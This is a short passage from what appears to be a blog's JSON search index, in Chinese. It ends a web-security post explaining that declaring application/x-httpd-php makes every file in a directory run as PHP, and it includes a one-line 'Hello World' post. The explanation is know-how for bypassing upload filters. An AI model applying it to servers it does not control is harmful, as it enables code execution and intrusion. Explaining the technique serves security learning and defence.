application/x-httpd-php意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行，不符合规则则报错\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"Hello World！","url":"/post/24608.html","content":"\n\n去没人的岛，摸鲨鱼的角。\n"}]